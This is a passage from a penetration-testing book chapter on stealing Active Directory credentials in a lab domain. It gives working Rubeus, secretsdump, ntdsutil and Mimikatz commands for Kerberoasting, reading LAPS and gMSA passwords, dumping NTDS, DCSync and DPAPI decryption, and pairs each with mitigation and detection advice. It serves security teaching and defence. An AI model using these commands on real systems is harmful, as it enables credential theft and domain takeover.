([adsisearcher]'(&amp;(samAccountType=805306368)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))').FindAll()</pre> <p>We have one promising candidate named <strong class="source-inline">sql_svc</strong>. We can confirm with the help of PowerView that this user has <span class="No-Break">an SPN:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer078">
<img alt="" height="512" role="presentation" src="image/B18964_04_13.jpg" width="662"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.13 – User with SPN found</p>
<p>To ensure that we are <a id="_idIndexMarker259"/>not dealing with a honeypot, we can check that the object really exists in the domain. What are the privileges of this object? Will we really benefit from roasting it? Also, its <strong class="source-inline">pwdLastSet</strong> and <strong class="source-inline">lastLogon</strong> attributes should be self-explanatory. The next smart move is to check the encryption type in the <strong class="source-inline">MsDS-SupportedEncryptionTypes</strong> attribute. In Rubeus, there is a parameter to filter AES-enabled accounts: <strong class="source-inline">/rc4opsec</strong>. As a last step, run the following command to obtain the hash (the <strong class="source-inline">/nowrap</strong> option will output the hash as <span class="No-Break">a one-liner):</span></p>
<pre class="console">
Rubeus.exe kerberoast /user:sql_svc</pre> <p>The output after executing the preceding command is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer079">
<img alt="" height="816" role="presentation" src="image/B18964_04_14.jpg" width="772"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.14 – Kerberoasting</p>
<p>Then, we can <a id="_idIndexMarker260"/>crack this hash with <strong class="source-inline">john</strong> <strong class="source-inline">(--format=krb5tgs</strong>) or <strong class="source-inline">hashcat</strong> (<strong class="source-inline">-m 13100</strong>). There is one important thing to add before we discuss mitigations. It is possible to perform targeted Kerberoasting if an attacker has the right to add an SPN to another account. We will discuss it in more detail in <a href="B18964_06.xhtml#_idTextAnchor119"><span class="No-Break"><em class="italic">Chapter 6</em></span></a>, <span class="No-Break"><em class="italic">Privilege Escalation</em></span><span class="No-Break">.</span></p>
<p>There is a C# tool written by <em class="italic">Luct0r</em> that fully implements OpSec recommendations from the blog post and can be found <span class="No-Break">on GitHub[24].</span></p>
<p>To mitigate such attacks, we need to avoid assigning SPNs to user accounts. If this is not possible, we can<a id="_idIndexMarker261"/> use <strong class="bold">Group Managed Service Accounts</strong> (<strong class="bold">gMSA</strong>) for automatic password management, which we will discuss in the next section. Also, honeypot accounts and prompt logging of the event and search filters can help to <span class="No-Break">identify attacks.</span></p>
<p>The next section will show how adversaries can abuse domain security enhancements if they <span class="No-Break">are misconfigured.</span></p>
<h1 id="_idParaDest-80"><a id="_idTextAnchor081"/>Automatic password management in the domain</h1>
<p>Some of the attacks from<a id="_idIndexMarker262"/> previously, for example, MS14-025 and Kerberoasting, contributed to the development of password management automation. To resolve the problem of local administrator password rotation, LAPS was created. To tackle Kerberoasting, gMSA was introduced a bit later <span class="No-Break">by Microsoft.</span></p>
<h2 id="_idParaDest-81"><a id="_idTextAnchor082"/>LAPS</h2>
<p>Now, we<a id="_idIndexMarker263"/> will deploy LAPS on <strong class="source-inline">braavos</strong> in the <strong class="source-inline">essos</strong> domain and discuss possible attack venues. I will follow this deployment guide[25]. The general steps include component installation, Active Directory schema extension, agent deployment on computers, and Group <span class="No-Break">Policy configuration.</span></p>
<p>The installation is straightforward. Just download the <strong class="source-inline">.msi</strong> file and deploy it. After running the following command, your schema will be extended (run as <span class="No-Break">schema admin):</span></p>
<pre class="console">
Update-AdmPwdADSchema</pre> <p>The output would be like what is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer080">
<img alt="" height="100" role="presentation" src="image/B18964_04_15.jpg" width="672"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.15 – Schema update was successful</p>
<p>The next step is the most important as misconfiguration here may lead to compromise. We need to assign users who will be able to view administrator passwords. By default, these users are is <strong class="source-inline">SYSTEM</strong> and from the “<strong class="source-inline">Domain Admins"</strong> group. This time, we will add non-privileged users to <span class="No-Break">this group:</span></p>
<pre class="console">
Set-AdmPwdReadPasswordPermission -OrgUnit "OU=Servers,DC=essos,DC=local" -AllowedPrincipals viserys.targaryen
Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Servers,DC=essos,DC=local"</pre> <p>The following screenshot<a id="_idIndexMarker264"/> shows the output of <span class="No-Break">the commands:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer081">
<img alt="" height="337" role="presentation" src="image/B18964_04_16.jpg" width="848"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.16 – Grant user LAPS read rights</p>
<p>Now, we will change sides and discuss the attacker’s options. First, we need to understand whether LAPS is installed. There are a few ways to get <span class="No-Break">an answer:</span></p>
<ul>
<li>Examine computer object attributes for the <strong class="source-inline">ms-Mcs-AdmPwdExpirationTime</strong> attribute with the help <span class="No-Break">of PowerView</span></li>
<li>Search for <strong class="source-inline">AdmPwd.dll</strong> in <span class="No-Break"><strong class="source-inline">C:\Program Files\LAPS\CSE</strong></span></li>
<li>Search for <a id="_idIndexMarker265"/>a <strong class="bold">Group Policy Object</strong> (<strong class="bold">GPO</strong>) named <em class="italic">LAPS</em>, <em class="italic">passwords</em>, or similar; however, do not fully rely <span class="No-Break">on naming</span></li>
</ul>
<p>Considering we are <a id="_idIndexMarker266"/>logged in as a domain user, we should be able to discover who is allowed to read the LAPS password. This can be done with the help <a id="_idIndexMarker267"/>of BloodHound and PowerView. Also, <strong class="bold">LAPSToolkit</strong>[26] can be used as a <a id="_idIndexMarker268"/>tool to execute the full attack chain. The output after <a id="_idIndexMarker269"/>running <strong class="source-inline">Invoke-ACLScanner</strong> from PowerView is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer082">
<img alt="" height="159" role="presentation" src="image/B18964_04_17.jpg" width="519"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.17 – User found with ReadLAPS privileges</p>
<p>If we have compromised such a user, we can obtain the local administrator password with the help of the <strong class="source-inline">Get-LAPSPasswords</strong> PowerShell commandlet[27]. The output from this operation is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer083">
<img alt="" height="418" role="presentation" src="image/B18964_04_18.jpg" width="530"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.18 – Local administrator password revealed</p>
<p>The only <a id="_idIndexMarker270"/>mitigations we can introduce here are being careful of who you delegate the right to reveal the password to and ensuring that you enforce an expiration time via Group Policy. This will help us to ensure passwords are <span class="No-Break">changed regularly.</span></p>
<h2 id="_idParaDest-82"><a id="_idTextAnchor083"/>gMSA</h2>
<p>gMSA was<a id="_idIndexMarker271"/> introduced in Windows Server 2016 but can be leveraged from Windows Server 2012 and above. The idea behind it has much in common with LAPS’s creation, but instead of local administrator accounts, it is used for <span class="No-Break">service accounts.</span></p>
<p>gMSA is an object type in Active Directory with attributes and permissions. The most interesting attributes are <strong class="source-inline">msDS-ManagedPassword</strong> (blob with a password) and <strong class="source-inline">msDS-GroupMSAMembership</strong> (who can read the blob). Let’s deploy gMSA and discuss the <span class="No-Break">attacking steps.</span></p>
<p>The first step is to create gMSA using the following two commands (run them as the domain administrator, not on <span class="No-Break">domain controllers):</span></p>
<pre class="console">
Add-KdsRootKey -EffectiveTime (Get-Date).AddHours(-10)
New-ADServiceAccount -Name sql_acc -DNSHostname braavos.essos.local</pre> <p>We can see that the account was successfully created in the Active Directory Users and <span class="No-Break">Computers console:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer084">
<img alt="" height="386" role="presentation" src="image/B18964_04_19.jpg" width="611"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.19 – gMSA created</p>
<p>The second step will be to set principals who are allowed to retrieve the plaintext password. We will again set the principals on an unprivileged user to demonstrate <span class="No-Break">the attack:</span></p>
<pre class="console">
Set-ADServiceAccount -Identity 'sql_acc' -PrincipalsAllowedToRetrieveManagedPassword 'viserys.targaryen'</pre> <p>An attacker <a id="_idIndexMarker272"/>can use the following command to obtain information about the principal who can retrieve the <span class="No-Break">managed password:</span></p>
<pre class="console">
Get-ADServiceAccount -filter * -prop * | select name,PrincipalsAllowedToRetrieveManagedPassword</pre> <p>The output of the commands is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer085">
<img alt="" height="83" role="presentation" src="image/B18964_04_20.jpg" width="1091"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.20 – User to retrieve the gMSA password</p>
<p>The third step is to compromise the user and retrieve the password as a blob that the attacker can then convert into an NT hash using the following commands and the <span class="No-Break"><strong class="source-inline">DSInternals</strong></span><span class="No-Break">[28] module:</span></p>
<pre class="console">
$pwd = Get-ADServiceAccount -identity sql_acc -Properties msds-ManagedPassword
$pw = ConvertFrom-ADManagedPasswordBlob $pwd.'msds-managedpassword'
ConvertTo-NTHash $pw.securecurrentpassword</pre> <p>The following screenshot shows <strong class="source-inline">SecureCurrentPassword</strong> and <strong class="source-inline">CurrentPassword</strong> in UTF-16 format. We have also converted <strong class="source-inline">SecureCurrentPassword</strong> into an <span class="No-Break">NT hash:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer086">
<img alt="" height="291" role="presentation" src="image/B18964_04_21.jpg" width="1032"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.21 – NT hash of the gMSA password</p>
<p>This hash can then be<a id="_idIndexMarker273"/> used for a pass-the-hash attack, which we will discuss in the <span class="No-Break">next chapter.</span></p>
<p>But if we do not have the AD module installed, we can use <strong class="source-inline">GMSAPasswordReader</strong> written in Windows, by <em class="italic">rvazarkar</em>[29], or <strong class="source-inline">gMSADumper</strong> in Linux, written by <em class="italic">micahvandeusen</em>[30]. The only caveat is that we need the account name to dump its hash. Run the simple command as a user who has privileges to read the <span class="No-Break">gMSA password:</span></p>
<pre class="console">
.\GMSAPasswordReader.exe --Accountname sql_acc</pre> <p>We will get the <span class="No-Break">following output:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer087">
<img alt="" height="143" role="presentation" src="image/B18964_04_22.jpg" width="875"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.22 – Result of using the GMSAPasswordRead tool</p>
<p>As usual, mitigations are<a id="_idIndexMarker274"/> to ensure that permissions are set correctly for GMSA. Also, event logs can be configured and monitored for event ID 4662, which will show what account has queried the <span class="No-Break"><strong class="source-inline">msDS-ManagedPassword</strong></span><span class="No-Break"> attribute.</span></p>
<h1 id="_idParaDest-83"><a id="_idTextAnchor084"/>NTDS secrets</h1>
<p>We will cover <a id="_idIndexMarker275"/>NTDS secrets extraction as this attack applies only to domain controllers. The ntds.dit file is a database that stores Active Directory data, including hashes. This file is in <strong class="source-inline">%systemroot\NTDS\ntds.dit</strong> and <strong class="source-inline">%systemroot\System32\ntds.dit</strong>. It is constantly in use, so it can’t be copied directly as any other file. There are different ways that ntds.dit data can <span class="No-Break">be dumped[31]:</span></p>
<ul>
<li><strong class="source-inline">ntdsutil.exe</strong> – Active Directory <span class="No-Break">maintenance tool</span></li>
<li><strong class="source-inline">VSSAdmin</strong> – volume <span class="No-Break">shadow copy</span></li>
<li><span class="No-Break"><strong class="source-inline">vshadow</strong></span></li>
<li><span class="No-Break"><strong class="source-inline">DiskShadow</strong></span></li>
<li><span class="No-Break"><strong class="source-inline">esentutl.exe</strong></span></li>
<li><strong class="source-inline">NinjaCopy</strong> <span class="No-Break">from PowerSploit</span></li>
<li><strong class="source-inline">Copy-VSS</strong> <span class="No-Break">from Nishang</span></li>
<li><strong class="source-inline">windows/gather/credentials/domain_hashdump</strong> <span class="No-Break">from Metasploit</span></li>
</ul>
<p>For our example, on a domain controller, we will run <strong class="source-inline">ntdsutil.exe</strong>, which will save the ntds.dit file and <strong class="source-inline">SYSTEM</strong> registry hive, which we can then move to our machine and extract hashes <span class="No-Break">using </span><span class="No-Break"><strong class="source-inline">secretsdump</strong></span><span class="No-Break">:</span></p>
<pre class="console">
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit
secretsdump -ntds ntds.dit.save -system system.save LOCAL</pre> <p>The output is as shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer088">
<img alt="" height="368" role="presentation" src="image/B18964_04_23.jpg" width="741"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.23 – Dumped hashes from NTDS.dit</p>
<p>To detect <a id="_idIndexMarker276"/>dumping, we need to enable command-line auditing and monitor event ID 4688 for signs of using tools from the preceding list. In the application log, check for NTDS database creation and detachment with event IDs 325, 326, 327, <span class="No-Break">and 216.</span></p>
<p>In the next section, we will execute a DCSync attack against the domain controller, which does not require us to run any commands on the machine itself. We can do it over the network, and in case of misconfiguration, our user could lose <span class="No-Break">all privileges.</span></p>
<h1 id="_idParaDest-84"><a id="_idTextAnchor085"/>DCSync</h1>
<p>DCSync uses the<a id="_idIndexMarker277"/> domain controller’s API to emulate the replication process from a remote domain controller. DCSync, in a nutshell, performs a <strong class="source-inline">DsGetNCChanges</strong> operation from a domain controller via an<a id="_idIndexMarker278"/> RPC request to the <strong class="bold">Directory Replication Service API</strong> (<strong class="bold">DRSUAPI</strong>). This attack requires extended privileges, <strong class="source-inline">DS-Replication-Get-Changes</strong> and <strong class="source-inline">DS-Replication-Get-Changes-All</strong>, which are assigned by default only to the “Domain Controllers”, “Domain Admins”, “Administrators”, and “Enterprise Admins” groups in <span class="No-Break">the domain.</span></p>
<p>If we were able to compromise the user with extended privileges, we could run <strong class="source-inline">secretsdump</strong> to obtain all hashes in <span class="No-Break">the domain:</span></p>
<pre class="console">
/usr/bin/impacket-secretsdump -outputfile 'something' 'essos'/'daenerys.targaryen':'BurnThemAll!'@'192.168.56.12'</pre> <p>The output <a id="_idIndexMarker279"/>produced<a id="_idTextAnchor086"/> by the preceding command is shown in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer089">
<img alt="" height="759" role="presentation" src="image/B18964_04_24.jpg" width="1091"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.24 – Result of DCSync attack</p>
<p>As we can see, a DCSync <a id="_idIndexMarker280"/>attack is powerful, allowing the complete takeover of the entire domain. To reduce the footprint, an adversary may run this attack directly on a domain controller, avoiding network detection. However, it requires domain <span class="No-Break">admin privileges.</span></p>
<p>Attack detection is possible via network traffic analysis or through event log monitoring. We can analyze traffic going toward domain controllers and check whether DRSUAPI RPC requests for the <strong class="source-inline">DsGetNCChanges</strong> operation are initiated by another domain controller. This can be done with the help of the tool named <strong class="source-inline">DCSYNCMonitor</strong>[32]. This tool accepts a list of domain controllers and will generate an event when there is a request from an <span class="No-Break">unknown source.</span></p>
<p>In the Windows event log, we can check for event ID 4662 and evaluate the <strong class="source-inline">Property</strong> value for control <span class="No-Break">access rights:</span></p>
<ul>
<li><span class="No-Break"><strong class="source-inline">1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="source-inline">DS-Replication-Get-Changes-All</strong></span><span class="No-Break">)</span></li>
<li><span class="No-Break"><strong class="source-inline">89e95b76-444d-4c62-991a-0facbeda640c</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="source-inline">DS-Replication-Get-Changes-In-Filtered-Set</strong></span><span class="No-Break">)</span></li>
<li><span class="No-Break"><strong class="source-inline">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="source-inline">DS-Replication-Get-Changes</strong></span><span class="No-Break">)</span></li>
</ul>
<p>Then, we need to check whether the value of <strong class="source-inline">Account Name</strong> is a domain controller. If it is not, then we can reliably detect DCSync. Event ID 4662 will appear in the log even if DCSync is running locally on the <span class="No-Break">domain controller.</span></p>
<p>Also, as DCSync<a id="_idIndexMarker281"/> uses the RPC protocol, ETW can be used to detect it on an endpoint, based on the UUID for DRSUAPI. Correlating <strong class="source-inline">DSRUAPI UUID</strong> (<strong class="source-inline">e3514235-4b06-11d1-ab04-00c04fc2dcd2</strong>) and <strong class="source-inline">OpNum 3</strong> (<strong class="source-inline">IDL_DRSGetNCChanges</strong>) would be a good indicator of <span class="No-Break">malicious activity[33].</span></p>
<h1 id="_idParaDest-85"><a id="_idTextAnchor087"/>Dumping user credentials in clear text via DPAPI</h1>
<p>Let us go through a scenario. Following internal security policies and after security awareness training, users started using Credential Manager in Windows instead of <strong class="source-inline">password.txt</strong> files. Credential <a id="_idIndexMarker282"/>Manager is a built-in password <a id="_idIndexMarker283"/>manager in Windows that uses the <strong class="bold">Data Protection API</strong> (<strong class="bold">DPAPI</strong>). DPAPI allows programs, such as Chrome or RDP, to store sensitive data transparently. This data is stored in a user’s directory and is encrypted by a key that is derived from the user’s password. Our target user, <strong class="source-inline">khal.drogo</strong>, had credentials in their Credential Manager for SQL <strong class="bold">system administrator</strong> (<strong class="bold">SA</strong>) account. An adversary has compromised the user with domain admin privileges and intends to pull the sa password in clear text. There are three <span class="No-Break">attack scenarios:</span></p>
<ul>
<li>Obtain <strong class="source-inline">khal.drogo</strong>’s master key and <span class="No-Break">then decrypt</span></li>
<li>Extract all local master keys if you have local <span class="No-Break">administrator privileges</span></li>
<li>Extract all backup master keys with the account in <strong class="bold">Domain </strong><span class="No-Break"><strong class="bold">Admins</strong></span><span class="No-Break"> group</span></li>
</ul>
<p>For demonstration purposes, we chose the third path. All commands are running under the <strong class="source-inline">daenerys.targaryen</strong> account (which is a member of “Domain <span class="No-Break">Admins” group).</span></p>
<p>The following steps are required for successful <span class="No-Break">password extraction:</span></p>
<ol>
<li>Locate credential files. Files are hidden and located in the <span class="No-Break">following path:</span><pre class="source-code">
<strong class="bold">dir /a:h C:\Users\khal.drogo\AppData\Local\Microsoft\Credentials\*</strong></pre></li> <li>Find the <strong class="source-inline">guidMasterKey</strong> value by using the Mimikatz <strong class="source-inline">dpapi::cred</strong> command with the path to the <span class="No-Break">credential file:</span><pre class="source-code">
<strong class="bold">mimikatz.exe "dpapi::cred /in:C:\Users\khal.drogo\AppData\Local\Microsoft\Credentials\value_from_step_1"</strong></pre></li> <li>Extract backup master keys from the <span class="No-Break">domain controller:</span><pre class="source-code">
<strong class="bold">mimikatz.exe "lsadump::backupkeys /system:meereen.essos.local /export"</strong></pre></li> <li>Retrieve the<a id="_idIndexMarker284"/> master key of the <span class="No-Break">user </span><span class="No-Break"><strong class="source-inline">khal.drogo</strong></span><span class="No-Break">:</span><pre class="source-code">
<strong class="bold">mimikatz.exe "dpapi::masterkey /in:"C:\Users\khal.drogo\AppData\Roaming\Microsoft\Protect\{USER_SID}\guidMasterKey_from_step_2" /pvk:p<a id="_idTextAnchor088"/>rivate_keyfile_from_step_3.pvk</strong></pre></li> <li>Decrypt <a id="_idIndexMarker285"/><span class="No-Break">saved credentials:</span><pre class="source-code">
<strong class="bold">mimikatz.exe "dpapi::cred /in: C:\Users\khal.drogo\AppData\Local\Microsoft\Credentials\value_from_step_1 /masterkey:key_value_from_step_4"</strong></pre></li> </ol>
<p>The result of the command execution can be seen in the <span class="No-Break">following screenshot:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer090">
<img alt="" height="625" role="presentation" src="image/B18964_04_25.jpg" width="941"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.25 – Clear-text sa password</p>
<p>This technique can be detected by command-line auditing, generating event ID 4688 for malicious tooling. A better option is to enable object auditing and check event ID 4662 for the object type (<strong class="source-inline">SecretObject</strong>), object name (*<strong class="source-inline">UPKEY</strong>*), and access mask (<span class="No-Break"><strong class="source-inline">0x2</strong></span><span class="No-Break">) values.</span></p>
<p>Just a quick remark that dumping the backup key is possible via DCSync as well. Domain objectGUID of the key needs to be found in Active Directory for <span class="No-Break">further dumping.</span></p>
<h1 id="_idParaDest-86"><a id="_idTextAnchor089"/>Summary</h1>
<p>This chapter was devoted to tools and techniques that can help you get access to credentials either in clear-text or hashed form. Obtaining such sensitive data is a crucial step to progress further in attacking Active Directory. We have also discussed OpSec consideration and possible <span class="No-Break">mitigation/detection options.</span></p>
<p>In the next chapter, we will cover lateral movement inside the domain and between forests. We will focus on relay and different types of pass-the-whatever attacks, finishin<a id="_idTextAnchor090"/>g with Kerberos delegation abuse and lateral movement <span class="No-Break">between forests.</span></p>
<h1 id="_idParaDest-87"><a id="_idTextAnchor091"/>References</h1>
<ol>
<li>Internal Monologue Attack – Retrieving NTLM Hashes without Touching <span class="No-Break">LSASS: </span><a href="https://github.com/eladshamir/Internal-Monologue"><span class="No-Break">https://github.com/eladshamir/Internal-Monologue</span></a></li>
<li>Pre-created computer account <span class="No-Break">research: </span><a href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/"><span class="No-Break">https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/</span></a></li>
<li>Exploiting <span class="No-Break">GPP: </span><a href="https://adsecurity.org/?p=2288"><span class="No-Break">https://adsecurity.org/?p=2288</span></a></li>
<li><span class="No-Break">CrackMapExec: </span><a href="https://github.com/Porchetta-Industries/CrackMapExec"><span class="No-Break">https://github.com/Porchetta-Industries/CrackMapExec</span></a></li>
<li><span class="No-Break">Kerbrute: </span><a href="https://github.com/ropnop/kerbrute"><span class="No-Break">https://github.com/ropnop/kerbrute</span></a></li>
<li><span class="No-Break">DomainPasswordSpray: </span><a href="https://github.com/dafthack/DomainPasswordSpray"><span class="No-Break">https://github.com/dafthack/DomainPasswordSpray</span></a></li>
<li>NTLM <span class="No-Break">relay: </span><a href="https://en.hackndo.com/ntlm-relay/"><span class="No-Break">https://en.hackndo.com/ntlm-relay/</span></a></li>
<li><span class="No-Break">Responder: </span><a href="https://github.com/lgandx/Responder"><span class="No-Break">https://github.com/lgandx/Responder</span></a></li>
<li>Harvesting <span class="No-Break">NetNTLM: </span><a href="https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/"><span class="No-Break">https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/</span></a></li>
<li>Coerced authentication <span class="No-Break">methods: </span><a href="https://github.com/p0dalirius/windows-coerced-authentication-methods"><span class="No-Break">https://github.com/p0dalirius/windows-coerced-authentication-methods</span></a></li>
<li><span class="No-Break">SpoolSample: </span><a href="https://github.com/leechristensen/SpoolSample"><span class="No-Break">https://github.com/leechristensen/SpoolSample</span></a></li>
<li><span class="No-Break">PetitPotam: </span><a href="https://github.com/topotam/PetitPotam"><span class="No-Break">https://github.com/topotam/PetitPotam</span></a></li>
<li>WebClient Service <span class="No-Break">Scanner: </span><a href="https://github.com/Hackndo/WebclientServiceScanner"><span class="No-Break">https://github.com/Hackndo/WebclientServiceScanner</span></a></li>
<li>Remotely enable the WebClient <span class="No-Break">service: </span><a href="https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/"><span class="No-Break">https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/</span></a></li>
<li><span class="No-Break">ShadowCoerce: </span><a href="https://github.com/ShutdownRepo/ShadowCoerce"><span class="No-Break">https://github.com/ShutdownRepo/ShadowCoerce</span></a></li>
<li><span class="No-Break">DFSCoerce: </span><a href="https://github.com/Wh04m1001/DFSCoerce"><span class="No-Break">https://github.com/Wh04m1001/DFSCoerce</span></a></li>
<li><span class="No-Break">Kerberos: </span><a href="https://en.hackndo.com/kerberos/"><span class="No-Break">https://en.hackndo.com/kerberos/</span></a></li>
<li>Kerberos <span class="No-Break">diagram: </span><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb366abf13"><span class="No-Break">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb366abf13</span></a></li>
<li><span class="No-Break">ASREQRoast: </span><a href="https://dumpco.re/blog/asreqroast"><span class="No-Break">https://dumpco.re/blog/asreqroast</span></a></li>
<li><span class="No-Break">Pcredz: </span><a href="https://github.com/lgandx/PCredz"><span class="No-Break">https://github.com/lgandx/PCredz</span></a></li>
<li><span class="No-Break">Hashcat: </span><a href="https://hashcat.net/hashcat/"><span class="No-Break">https://hashcat.net/hashcat/</span></a></li>
<li><span class="No-Break">Rubeus: </span><a href="https://github.com/GhostPack/Rubeus"><span class="No-Break">https://github.com/GhostPack/Rubeus</span></a></li>
<li>Kerberoast with <span class="No-Break">OpSec: </span><a href="https://m365internals.com/2021/11/08/kerberoast-with-opsec/"><span class="No-Break">https://m365internals.com/2021/11/08/kerberoast-with-opsec/</span></a></li>
<li><span class="No-Break">KerberOPSEC: </span><a href="https://github.com/Luct0r/KerberOPSEC"><span class="No-Break">https://github.com/Luct0r/KerberOPSEC</span></a></li>
<li>LAPS <span class="No-Break">deploy: </span><a href="https://theitbros.com/deploying-local-administrator-password-solution-laps-in-active-directory/"><span class="No-Break">https://theitbros.com/deploying-local-administrator-password-solution-laps-in-active-directory/</span></a></li>
<li><span class="No-Break">LAPSToolkit: </span><a href="https://github.com/leoloobeek/LAPSToolkit"><span class="No-Break">https://github.com/leoloobeek/LAPSToolkit</span></a></li>
<li><span class="No-Break">Get-LAPSPasswords: </span><a href="https://github.com/kfosaaen/Get-LAPSPasswords"><span class="No-Break">https://github.com/kfosaaen/Get-LAPSPasswords</span></a></li>
<li><span class="No-Break">DSInternals: </span><a href="https://github.com/MichaelGrafnetter/DSInternals"><span class="No-Break">https://github.com/MichaelGrafnetter/DSInternals</span></a></li>
<li><span class="No-Break">GMSAPasswordReader: </span><a href="https://github.com/rvazarkar/GMSAPasswordReader"><span class="No-Break">https://github.com/rvazarkar/GMSAPasswordReader</span></a></li>
<li><span class="No-Break">gMSADumper: </span><a href="https://github.com/micahvandeusen/gMSADumper"><span class="No-Break">https://github.com/micahvandeusen/gMSADumper</span></a></li>
<li>Dumping domain <span class="No-Break">credentials: </span><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials"><span class="No-Break">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials</span></a></li>
<li><span class="No-Break">DCSYNCMonitor: </span><a href="https://github.com/shellster/DCSYNCMonitor"><span class="No-Break">https://github.com/shellster/DCSYNCMonitor</span></a></li>
<li>Detect a DCSync attack via <span class="No-Break">ETW: </span><a href="https://www.netero1010-securitylab.com/detection/dcsync-detection"><span class="No-Break">https://www.netero1010-securitylab.com/detection/dcsync-detection</span></a></li>
</ol>
<h1 id="_idParaDest-88"><a id="_idTextAnchor092"/>Further reading</h1>
<p>These resources for further study will help you dive deeper into the attacks covered in <span class="No-Break">the chapter:</span></p>
<ul>
<li>A good walk-through of WebDAV abuse and a further attack <span class="No-Break">path: </span><a href="https://pentestlab.blog/2021/10/20/lateral-movement-webclient/"><span class="No-Break">https://pentestlab.blog/2021/10/20/lateral-movement-webclient/</span></a></li>
<li>A great writeup with traffic samples and event IDs generated during AS-REP <span class="No-Break">roasting: </span><a href="https://rioasmara.com/2020/07/04/kerberoasting-as-req-pre-auth-vs-non-pre-auth/"><span class="No-Break">https://rioasmara.com/2020/07/04/kerberoasting-as-req-pre-auth-vs-non-pre-auth/</span></a></li>
<li>A blog post with a focus on detecting and preventing AS-REP <span class="No-Break">roasting: </span><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/"><span class="No-Break">https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/</span></a></li>
<li>A step-by-step guide on how to implement and abuse gMSA in the <span class="No-Break">domain: </span><a href="https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/"><span class="No-Break">https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/</span></a></li>
<li>A blog post about NTLM relay for gMSA passwords published by <span class="No-Break"><em class="italic">Cube0x0</em></span><span class="No-Break">: </span><a href="https://cube0x0.github.io/Relaying-for-gMSA/"><span class="No-Break">https://cube0x0.github.io/Relaying-for-gMSA/</span></a></li>
</ul>
</div>
</div></body></html>